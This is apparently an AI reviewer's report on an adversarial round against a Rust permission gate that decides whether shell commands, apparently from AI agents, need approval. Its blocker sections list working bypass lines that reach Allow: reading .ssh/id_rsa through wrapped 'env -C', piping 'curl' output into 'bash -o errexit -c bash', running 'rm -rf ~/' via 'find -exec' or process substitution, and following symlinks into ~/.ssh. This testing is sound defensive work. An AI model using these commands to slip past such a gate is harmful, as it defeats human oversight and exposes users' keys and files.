# Review: M1-13-adversarial eighth and last round (commit b336b2c)

Reviewer: Gemini 4 Hydrogen `high`, read-only (D-096). Author: Claude Opus 5.5. Saved by the orchestrator from the run's final message.

## Verdict: `rework`

For Pedro's merge decision, the `regression vs dev` vs `same as dev` split on `b336b2c` is clean:

- **No `Allow` regressions vs `dev` were found.** Every remaining `Allow` gap below gives **`same as dev`** (`dev` already returns `Allow` under `Any`/`FullAccess` — and in two cases under prefix rules too), while `b336b2c` strictly closes the round-7 wrapper/abbreviated-flag/`env --chd`/`find -exec $(which rm)`/`pipe-to-shell` gaps.
- **One false hard-deny `regression vs dev` (Major 5):** when `cwd` holds a folder linked into `~/.ssh` (`~/.ssh/work -> ~/vault/work`), [gate.rs:642-662](crates/atrium-core/src/policy/gate.rs#L642-L662) unconditionally strips `-L` / `--follow` / `'L'` inside `rg` invocations *before* pairing flag values (`-e`, `-f`, `-g`, `-r`), turning ordinary searches like `rg -e -L safe_sub`, `rg -rL pat safe_sub`, `rg -e --follow safe_sub`, `rg -g -L pat safe_sub`, `rg -f -L safe_sub`, and `rg --file -L safe_sub` into **`Hard(credential-read)`** across all settings (`dev` allows them). Because a false hard deny cannot be overridden, this must be fixed before merging.
- Several round-7 structural invariants (**B1–B4**) are also still only partially closed on `b336b2c` (direct neighbours of round 7's fixes, detailed in Blockers 1–4).

All temporary probe files were deleted before finishing (`git status --short` is empty).

---

## Findings

> Sensitive-path and hard-deny `Allow` findings are listed first, marked `same as dev` or `regression vs dev`.

### Blockers (sensitive-path / hard-deny inputs reaching `Allow`)

#### 1. [blocker] B1 invariant incomplete: `runs_here` (`eval`/`source`/`.`), `env_payloads`, and `<(...)` process substitutions still inspect only `eff` or raw `seg.argv`, missing `other_readings` and substituted `env` — **`same as dev`**
- **Locations:** [shell.rs:1098-1139](crates/atrium-core/src/policy/shell.rs#L1098-L1139) (`same_shell_owner`, `env_payloads`, `<(...)` check)
- **Mechanism:**
  1. `same_shell_owner = runs_here(&eff, depth)` ([shell.rs:1101](crates/atrium-core/src/policy/shell.rs#L1101)) checks only `eff`, not `other_readings`. When a wrapper has an unknown option whose two-way reading moves past a value in `other_readings` (e.g. `command -Z X eval ...` or `env --unknown-val X eval ...`), `eval` runs in `other_readings` with `same_shell: false`.
  2. `payloads.extend(env_payloads(&seg.argv))` ([shell.rs:1108](crates/atrium-core/src/policy/shell.rs#L1108)) scans only raw `seg.argv`, never `eff` / `other_readings` after substitution/wrapper unwrapping. So `$(which env) -C ..`, `$(which env) --chd ..`, `env -i $(which env) -C ..`, and `$(which timeout) 5 $(which env) -C ..` never extract the `-C`/`--chd` inner unit.
  3. The `<(...)` process-substitution check ([shell.rs:1125-1139](crates/atrium-core/src/policy/shell.rs#L1125-L1139)) checks only `eff.first()`, not `other_readings`, so `env --zzz X bash <(echo 'rm -rf ~/')` and `xargs -l 5 bash <(echo 'rm -rf ~/')` miss `<(...)` when `eff[0]` is `"X"` / `"5"`.
- **Comparison with `dev` (`same as dev`):** On `dev` (`git show dev:crates/atrium-core/src/policy/shell.rs` [659-705, 878-964, 497-510]), `command` / `env` stop on `X`, `$(...)` at command position is never unwrapped in `unwrap`, `env_payloads` does not exist, and `<(...)` only populates `subs` (lexing `echo 'rm -rf ~/'` as `echo`, never running its output). All of these already reach `Allow` under `Any` and `FullAccess` on `dev` (`xargs -l 5 bash <(echo 'rm -rf ~/')` also under `xargs` prefix rules on `dev` because `dev`'s `xargs` only skips `-L`, not `-l`).
- **Evidence** (`[home, prefix(wrappers/cd/cat/bash/echo/env/command/xargs), any, full]`):
  - `command -Z X eval 'cd ~/.ssh && true' && cat id_rsa` -> `Ask | Ask | Allow | Allow`
  - `env --unknown-val X eval 'cd ~/.ssh && true' && cat id_rsa` -> `Ask | Ask | Allow | Allow`
  - (from `cwd = ~/proj`) `$(which env) --chd .. cat .ssh/id_rsa` -> `Ask | Ask | Allow | Allow`
  - (from `cwd = ~/proj`) `$(which env) -C .. cat .ssh/id_rsa` -> `Ask | Ask | Allow | Allow`
  - (from `cwd = ~/proj`) `env -i $(which env) -C .. cat .ssh/id_rsa` -> `Ask | Ask | Allow | Allow`
  - (from `cwd = ~/proj`) `$(which timeout) 5 $(which env) -C .. cat .ssh/id_rsa` -> `Ask | Ask | Allow | Allow`
  - `env --zzz X bash <(echo 'rm -rf ~/')` -> `Ask | Ask | Allow | Allow`
  - `xargs -l 5 bash <(echo 'rm -rf ~/')` -> `Ask | Ask | Allow | Allow`
  - *(Note on round 7 `cd proj && $(which source) ./helper.sh && cat .npmrc` and `cd proj && $(which .) ./helper.sh && cat .npmrc`: both return `Ask | Ask | Allow | Allow` — `source ./helper.sh` itself sets `cwd` to uncertain, so `Any`/`FullAccess` keep `dev`'s `Allow` per **D-078**, whereas `source ./helper.sh && cat .npmrc` from `~` and `$(which source) <(echo 'cd ~/.ssh') && cat id_rsa` return `Hard(credential-read)` in all 4 settings.)*

#### 2. [blocker] B2 invariant incomplete: `reaches_tree_through_links` misses 2-hop symlinks, drops `None` from `expand_glob` when `~/.ssh` has no outbound link, omits `atrium_*_paths`, and skips abbreviated long flags / other `-L` walkers — **`same as dev`**
- **Locations:** [gate.rs:311-327](crates/atrium-core/src/policy/gate.rs#L311-L327) (`evaluate_sync`), [gate.rs:962-979](crates/atrium-core/src/policy/gate.rs#L962-L979) (`follows_links`), [gate.rs:1015-1026](crates/atrium-core/src/policy/gate.rs#L1015-L1026) (`links_below`), [gate.rs:1084-1091](crates/atrium-core/src/policy/gate.rs#L1084-L1091) (`reaches_tree_through_links`)
- **Mechanism:**
  1. **2-hop symlinks inside a project:** `links_below` ([gate.rs:1015-1023](crates/atrium-core/src/policy/gate.rs#L1015-L1023)) checks if a symlink canonicalizes inside `trees`, and otherwise drops it without descending if `real` is an ordinary directory containing another symlink into `~/.ssh`.
  2. **`expand_glob` returning `None` drops `Reach::Maybe`:** In `reaches_tree_through_links` ([gate.rs:1087-1089](crates/atrium-core/src/policy/gate.rs#L1087-L1089)), `if globby && let Some(found) = expand_glob(p)` silently keeps `targets = [p]` instead of setting `maybe = true` when `expand_glob` returns `None` (>4096 entries, >12 deep `**`, `$`, unexpanded `{1..65}`). (The `adversarial_regression` tests masked this because `~/.ssh/work` was also present, making `reaches_linked_ssh_dir` return `Reach::Maybe`; without `~/.ssh/work`, it returns `Allow` under `Any`/`FullAccess`.)
  3. **Atrium protected/data paths omitted:** `evaluate_sync` calls `deny::sensitive_roots(&c.home, &[], &[])` ([gate.rs:312](crates/atrium-core/src/policy/gate.rs#L312)), omitting `c.atrium_data_paths` and `c.atrium_protected_paths`.
  4. **`follows_links` table omissions:** Checks exact `--dereference-recursive`/`--follow` (missing GNU prefixes like `grep --deref`, `ag --fol`, `ack --fol`) and omits other link-following tree copiers/archivers (`cp -RL`, `cp --dereference -r`, `tar -chzf`, `rsync -aL`, `zip -r`).
- **Comparison with `dev` (`same as dev`):** On `dev` (`git show dev:crates/atrium-core/src/policy/gate.rs:178-239`), neither `reaches_linked_ssh_dir` nor `reaches_tree_through_links` exists; `dev` only does literal `fs_resolve` + `alias_fix` on members of `~/.ssh`. Globs over symlinks, `-L`/`-R`/`-f`/`--follow` walkers on parent directories, and globs over symlinked `atrium_*_paths` all return `Allow` under `Any`/`FullAccess` on `dev`.
- **Evidence** (`Tmp` + `SessionGate`, settings `[home, any, full]`):
  - Isolated (`~/.ssh/work` absent; `proj_2hop/sub -> ~/other_dir`, `~/other_dir/nested_ssh -> ~/.ssh`; `big_dir` has 4151 entries with `z_ssh -> ~/.ssh`; `proj_plain/link_ssh -> ~/.ssh`):
    - `rg -L id proj_2hop` -> `Ask | Allow | Allow`
    - `find -L proj_2hop -name '*rsa*'` -> `Ask | Allow | Allow`
    - `grep -R id proj_2hop` -> `Ask | Allow | Allow`
    - `ag -f id proj_2hop` -> `Ask | Allow | Allow`
    - `ack --follow id proj_2hop` -> `Ask | Allow | Allow`
    - `grep --deref id proj_2hop` -> `Ask | Allow | Allow`
    - `ag --fol id proj_2hop` -> `Ask | Allow | Allow`
    - `ack --fol id proj_2hop` -> `Ask | Allow | Allow`
    - `cat big_dir/*/*` -> `Ask | Allow | Allow`
    - `cat big_dir/*/id_rsa` -> `Ask | Allow | Allow`
    - `cat proj_plain/{1..65}/*` -> `Ask | Allow | Allow`
    - `cat proj_plain/${DIR}/*` -> `Ask | Allow | Allow`
    - `cat proj_plain/vault_*/*` -> `Ask | Allow | Allow`
  - With `proj/vault_link -> ~/.ssh` and `proj_atrium/prot_link -> ~/.config/atrium`:
    - `cat proj_atrium/*` -> `Ask | Allow | Allow`
    - `cat proj_atrium/*/config.toml` -> `Ask | Allow | Allow`
    - `cp -RL proj /tmp/x` -> `Ask | Allow | Allow`
    - `cp --dereference -r proj /tmp/x` -> `Ask | Allow | Allow`
    - `tar -chzf /tmp/x.tgz proj` -> `Ask | Allow | Allow`
    - `rsync -aL proj /tmp/x` -> `Ask | Allow | Allow`
    - `zip -r /tmp/x.zip proj` -> `Ask | Allow | Allow`

#### 3. [blocker] B3 invariant incomplete: `shell_c_code` stops on `-o`/`+o`/`-O`/`+O` values, and `long_name` ignores 1–2 letter GNU prefixes like `script --c` / `flock --c` — **`same as dev`**
- **Locations:** [shell.rs:1862-1875](crates/atrium-core/src/policy/shell.rs#L1862-L1875) (`shell_c_code`), [shell.rs:1820](crates/atrium-core/src/policy/shell.rs#L1820) (`long_name`), [deny.rs:591-611](crates/atrium-core/src/policy/deny.rs#L591-L611) (`reads_stdin_as_code_at`)
- **Mechanism:**
  1. `shell_c_code` ([shell.rs:1864-1873](crates/atrium-core/src/policy/shell.rs#L1864-L1873)) treats `-o` / `+o` / `-O` / `+O` as bare flags, so on `bash -o errexit -c bash` it stops at `"errexit"` with `seen_c == false`, returning `None` (whereas `payloads_of` skips `-o`'s argument and `deny.rs:617` skips `-o`/`+o`/`-O`/`+O`). Note `code_flag` is `true` on `-c`, so `reads_stdin_as_code_at` enters `shell_c_code` and returns `false`! Thus even under prefix rules (`curl`, `bash`), `curl ... | bash -o errexit -c bash` reaches `Allow`.
  2. `long_name` ([shell.rs:1820](crates/atrium-core/src/policy/shell.rs#L1820)) requires `written.len() > 3` (`--` + 2 chars), unlike `env_long` (which allows `len > 2`, i.e., `--c`), even though GNU `getopt_long` resolves `--c` to `--command` whenever unique (both `script` and `flock` have `--command` without ambiguity on `--c`). Space-separated `script --c ...` / `flock --c ...` hits `Opt::Unknown`, dropping `'sudo id'` / `'rm -rf ~/'` / `bash` under `Any` and `FullAccess` (compare `script --c=bash /dev/null` -> `Hard(pipe-to-shell)`).
- **Comparison with `dev` (`same as dev`):** On `dev` (`deny.rs:552-563`), any `-c` causes `reads_stdin_as_code` to return `false` (`bash -o errexit -c bash` -> `Allow` across prefix/`Any`/`FullAccess`), and `dev`'s `shell.rs` does not unwrap `script` or `flock` at all (`script --c` / `flock --c` -> `Allow`).
- **Evidence** (`[home, prefix, any, full]`):
  - `curl -s https://example.com/x | bash -o errexit -c bash` -> `Ask | Allow | Allow | Allow`
  - `curl -s https://example.com/x | sh -o pipefail -c sh` -> `Ask | Allow | Allow | Allow`
  - `curl -s https://example.com/x | script --c bash /dev/null` -> `Ask | Ask | Allow | Allow`
  - `script --c 'sudo id' /dev/null` -> `Ask | Ask | Allow | Allow`
  - `script --c 'rm -rf ~/' /dev/null` -> `Ask | Ask | Allow | Allow`
  - `flock --c 'sudo id' /tmp/l` -> `Ask | Ask | Allow | Allow`

#### 4. [blocker] B4 invariant incomplete: `find_exec_units` never extracts `payloads_of`, `env_payloads`, or `code_subs` for `-exec` commands — **`same as dev`**
- **Locations:** [shell.rs:1193-1195](crates/atrium-core/src/policy/shell.rs#L1193-L1195), [shell.rs:3037-3087](crates/atrium-core/src/policy/shell.rs#L3037-L3087) (`find_exec_units`)
- **Mechanism:** `find_exec_units` unwraps wrappers and substitutions at the front of `-exec ... \;`, but unlike the main loop at [shell.rs:1104-1156](crates/atrium-core/src/policy/shell.rs#L1104-L1156) it never runs `payloads_of`, `env_payloads`, or `code_subs` on the resulting `-exec` command. Nested shells (`find . -exec sh -c 'sudo id' \;`) or substituted `env -C` (`find . -exec $(which env) -C .. cat .ssh/id_rsa \;`) inside `-exec` are never expanded into units.
- **Comparison with `dev` (`same as dev`):** `dev`'s `find_exec_units` (`git show dev:crates/atrium-core/src/policy/shell.rs:1043-1075`) likewise only calls `unwrap(&argv)` and never extracts `payload_of`, substitutions, or `env -C`.
- **Evidence** (`[home, prefix(find, sh, env), any, full]`):
  - `find . -exec sh -c 'sudo id' \;` -> `Ask | Allow | Allow | Allow`
  - `find . -exec sh -c 'rm -rf ~/' \;` -> `Ask | Allow | Allow | Allow`
  - `find . -exec $(which sh) -c 'sudo id' \;` -> `Ask | Ask | Allow | Allow`
  - (from `cwd = ~/proj`) `find . -exec $(which env) -C .. cat .ssh/id_rsa \;` -> `Ask | Ask | Allow | Allow`

---

### Majors (false hard denies on ordinary lines)

#### 5. [major] `rg` `-L` / `--follow` stripping in `searches_cwd` consumes flag values (`-e`, `-r`, `-g`, `-f`), causing false `Hard(credential-read)` on ordinary searches when `cwd` holds a linked `~/.ssh` folder — **`regression vs dev`**
- **Location:** [gate.rs:642-662](crates/atrium-core/src/policy/gate.rs#L642-L662) (`searches_cwd` for `"rg"`)
- **Mechanism:** Before calling `engine::search_roots(true, &args)`, the `"rg"` arm filters out any arg equal to `--follow` and removes `'L'` from any short cluster `-...L...` (dropping `-L` altogether when `rest.is_empty()`), without tracking options that take a value (`-e`, `-f`, `-g`, `-r`, `-t`, `-T`, `-m`, `-A`, `-B`, `-C`, `--regexp`, `--file`, etc.). When `-L` or `--follow` is the pattern/glob argument (`rg -e -L safe_sub`), or when `'L'` is stripped from `-rL` (`-r` replacement), the value is deleted or altered, shifting `safe_sub` into the option-value slot so `search_roots` reports `roots.is_empty() == true`, `searches_cwd` returns `Some(true)`, and `reaches_linked_ssh_dir` emits `Hard(credential-read)` across every setting.
- **Comparison with `dev` (`regression vs dev`):** `dev` has no `reaches_linked_ssh_dir` or `searches_cwd` (`git show dev:crates/atrium-core/src/policy/gate.rs:178-239`), so all six commands below return `Allow` on `dev` under `Any`/`FullAccess` (and `Allow` on `Home` except `rg -f -L` / `rg --file -L` which ask under `Home` only when without `-L`? Wait: on `b336b2c`, WITHOUT `~/.ssh/work` linked, `rg -e -L safe_sub`, `rg -e --follow safe_sub`, `rg -rL pat safe_sub`, and `rg -g -L pat safe_sub` all return `Allow | Allow | Allow`, confirming the hard deny is an artifact of the new `searches_cwd` `"rg"` filter).
- **Evidence** (`Tmp` + `SessionGate`, `cwd = ~/vault`, `~/.ssh/work -> ~/vault/work`, `vault/safe_sub/a.rs`, `[home, any, full]`):
  - `rg -e -L safe_sub` -> `Hard(credential-read)` across all 3 settings (`Allow | Allow | Allow` without `~/.ssh/work`)
  - `rg -e --follow safe_sub` -> `Hard(credential-read)` across all 3 settings (`Allow | Allow | Allow` without `~/.ssh/work`)
  - `rg -rL pat safe_sub` -> `Hard(credential-read)` across all 3 settings (`Allow | Allow | Allow` without `~/.ssh/work`)
  - `rg -g -L pat safe_sub` -> `Hard(credential-read)` across all 3 settings (`Allow | Allow | Allow` without `~/.ssh/work`)
  - `rg -f -L safe_sub` -> `Hard(credential-read)` across all 3 settings (`Ask | Allow | Allow` without `~/.ssh/work`)
  - `rg --file -L safe_sub` -> `Hard(credential-read)` across all 3 settings

---

## Check-by-Check Summary

1. **Previous reviews (all 5 reviews across `Home`, prefix rules, `Any`, `FullAccess`):**
   - `adversarial_regression` (57/57), `adversarial_ordinary` (14/14), `adversarial_policy` (15/15 active; 3 pre-existing ignored), `adversarial_gate` (9/9 active; 2 pre-existing ignored), and `policy` (44/44) all pass on `b336b2c`.
   - Re-running round 7's exact blocker/major lines: **M6**, **B2** (direct `proj/vault_link -> ~/.ssh`), **B3**, **B4**, **B5**, and **B1** (`$(which eval)`, `$(which env) eval`, `env --chd ..`) all now hit the expected `Hard(...)` / `Allow` verdicts, **except** `cd proj && $(which source) ./helper.sh && cat .npmrc` and `cd proj && $(which .) ./helper.sh && cat .npmrc`, which return `Ask | Ask | Allow | Allow` (same `Allow` under `Any`/`FullAccess` as bare `cd proj && source ./helper.sh && cat .npmrc` per D-078 uncertain cwd, and `Ask` under `prefix` because `$(which source)` does not match `prefix(source)`).
2. **Round 7 invariants (M6, B1–B5) and new spellings:**
   - **M6:** `ag --filename-pattern '*.rs' safe_sub`, `ack --match pat safe_sub`, `ack --type=rust pat safe_sub` (`Ask | Allow | Allow`), `rg --files safe_sub`, `rg --type-list safe_sub`, `grep -r -e -R safe_sub`, `grep -r --include='*.rs' pat safe_sub` (`Allow | Allow | Allow`), and `rg --no-follow pat safe_sub` / `ag --filename-pat '*.rs' safe_sub` / `ag --list-file-types` / `ack --help` (`Ask | Ask | Ask`) avoid false hard denies. However, the new `"rg"` `-L`/`--follow` filter breaks `rg -e -L safe_sub` etc. (Major 5).
   - **B1:** `$(which eval)`, `$(which env) eval`, `env --c ..`, `env --c=..`, `env --block-signal=INT --chd ..`, and `script -t 0 bash <(echo 'rm -rf ~/')` pass (`Hard(...)`); misses `command -Z X eval`, `env --unknown-val X eval`, `$(which env) --chd ..`, `$(which env) -C ..`, `env -i $(which env) -C ..`, `$(which timeout) 5 $(which env) -C ..`, `env --zzz X bash <(...)`, and `xargs -l 5 bash <(...)` (Blocker 1).
   - **B2:** Direct `proj/vault_link -> ~/.ssh` (`rg -L`, `find -L`, globs), `ls proj/*`, `ls -la proj/*`, `ls -R proj/*`, `ls proj/*/*` (`Ask | Allow | Allow`), and `deep_dir` (>16 deep -> `Ask | Ask | Ask`) work as intended; misses 2-hop links, `expand_glob == None` when `~/.ssh` has no outbound links, `atrium_*_paths` globs, abbreviated `--fol`/`--deref`, and `cp -RL`/`tar -chzf`/`rsync -aL`/`zip -r` (Blocker 2).
   - **B3:** `script --c=bash`, nested depth 3–4 `script -c 'sh -c "sh -c \"sh -c bash\""'`, `$(which env) $(which script) -c bash`, `script -c '$(which env) $(which bash)'`, `script -c 'bash -o errexit -c sh'` -> `Hard(pipe-to-shell)`; `script -c 'sh -c "cat"'` -> `Ask | Allow | Allow | Allow`; depth 5 `sh -c` -> fails closed (`Hard(pipe-to-shell)`). Misses `bash -o errexit -c bash`, `sh -o pipefail -c sh`, and `script --c` / `flock --c` (Blocker 3).
   - **B4:** `find . -exec $(which env) $(which rm) -rf ~/ \;`, `$(which find) . -exec $(which rm) -rf ~/ \;`, `find . -exec $(which env) -S 'rm -rf ~/' \;`, `find . -exec env --c .. cat .ssh/id_rsa \;`, `find . -exec env -C .. cat .ssh/id_rsa \;`, and `$(which env) $(which sh) -c 'sudo id'` -> `Hard(...)`. Misses `find -exec sh -c '...'` and `find -exec $(which env) -C ..` (Blocker 4).
   - **B5:** `timeout --s KILL 5 sudo id`, `timeout --s=KILL 5 sudo id`, `xargs -i{} sudo id` -> `Hard(privilege-escalation)`; `xargs --rep {} sudo id`, `xargs --max-l 5 sudo id` -> `Ask | Allow | Allow | Allow` (GNU `--replace[=R]`/`--max-lines[=N]` only take `=`, so `{}`/`5` is the command, matching GNU `xargs`); `xargs -l 5 echo hi` (`Ask | Ask | Allow | Allow`), `xargs -I {} echo {}` (`Ask | Allow | Allow | Allow`), `timeout --sig KILL 5 make` (`Ask | Allow | Allow | Allow`), `timeout --unknown 5 make` (`Ask | Ask | Allow | Allow`), `script --unknown /dev/null make` (`Ask | Ask | Allow | Allow`) all behave cleanly.
3. **`Allow` vs `dev` split:** Checked directly against `dev:crates/atrium-core/src/policy/{gate.rs,shell.rs,deny.rs}`. All Blockers 1–4 are `same as dev`; Major 5 is `regression vs dev`.
4. **`Allow` hunt in new code:** Covered in Blockers 1–4 above.
5. **False hard-deny hunt on ordinary lines:**
   - Compounds in `cd proj && ... && cat .npmrc` (`(cd sub && make) > /dev/null`, `{ ls; } | grep x`, `if true; then ls; fi | wc -l`, `while read l; do echo "$l"; done < f | sort`, `time make`, `! false`), ordinary `find . -name '*.o' -delete` (from `cwd = proj`), `ag`/`ack`/`grep` with options, wrappers (`xargs -I {}`, `timeout --sig`, `timeout --unknown`, `script --unknown`), and `clean/src/*.rs`, `proj/src/*.rs`, `ls proj/*` all avoid false hard denies.
   - `rg -e -L`, `rg -e --follow`, `rg -rL`, `rg -g -L`, `rg -f -L`, `rg --file -L` on a safe subdir when `cwd` holds a linked `~/.ssh` folder are falsely hard-denied (Major 5).
6. **Convergence assessment:**
   - Every finding left (**Blocker 1–4**, **Major 5**) is a **direct neighbour** of the round-7/8 mechanisms, not a new architectural class:
     1. Run `runs_here`, `env_payloads`, and `<(...)` over all `eff` + `other_readings` (with substitution resolution on `env`), and extract `payloads_of`/`env_payloads`/`code_subs` in `find_exec_units`.
     2. Handle `-o`/`+o`/`-O`/`+O` values in `shell_c_code` and allow `--c` (`len > 2` when unique, like `env_long`) in `long_name`.
     3. In `gate.rs`: fix `rg`'s `-L`/`--follow` stripping to respect option-value pairs (same option table already used by `search_roots`), propagate `Maybe` when `expand_glob` returns `None` or symlinks go 2+ hops, and pass `c.atrium_data_paths`/`c.atrium_protected_paths` into `trees` at `gate.rs:312`.
   - **Yes — one small targeted follow-up would close all five**, and if you only care about the `>= dev` rule, fixing Major 5 alone removes the sole regression vs `dev`. As `b336b2c` stands, I do **not** approve because Major 5 breaks ordinary `rg` invocations with a false hard deny when a `~/.ssh` link sits inside `cwd`.

---

## Commands Run (on clean tree at `b336b2c`)

- `git status --short` -> clean (empty output).
- `cargo clippy -p atrium-core --all-targets -- -D warnings` -> exit `0` (`Finished dev profile ... in 0.13s`, 0 warnings).
- `cargo test -p atrium-core --no-fail-fast` -> exit `0`, 0 failures across all targets:
  - `src/lib.rs`: `9 passed; 0 failed; 0 ignored` (`0.00s`)
  - `adversarial_fuzz`: `2 passed; 0 failed; 1 ignored` (`random_spellings_of_sensitive_paths_are_always_hard_denied`, `M1-13 finding 11`) (`16.23s`)
  - `adversarial_gate`: `9 passed; 0 failed; 2 ignored` (`0.11s`)
  - `adversarial_ledger`: `14 passed; 0 failed; 0 ignored` (`0.16s`)
  - `adversarial_ordinary`: `14 passed; 0 failed; 0 ignored` (`0.10s`)
  - `adversarial_policy`: `15 passed; 0 failed; 3 ignored` (`0.07s`, re-verified directly)
  - `adversarial_regression`: `57 passed; 0 failed; 0 ignored` (`1.64s`, re-verified directly)
  - `attention`: `8 passed; 0 failed; 0 ignored` (`0.00s`, re-verified directly)
  - `history`: `25 passed; 0 failed; 0 ignored` (`1.44s`, re-verified directly)
  - `ledger`: `20 passed; 0 failed; 0 ignored` (`0.01s`)
  - `policy`: `44 passed; 0 failed; 0 ignored` (`36.89s`)
  - `store`: `28 passed; 0 failed; 0 ignored` (`37.83s`)
  - `Doc-tests atrium_core`: `0 tests` (`0.00s`)
- `cargo test -p atrium-core --test adversarial_fuzz` (standalone; `time` is not on the workspace allowlist) -> exit `0`: `2 passed; 0 failed; 1 ignored; finished in 15.61s`.
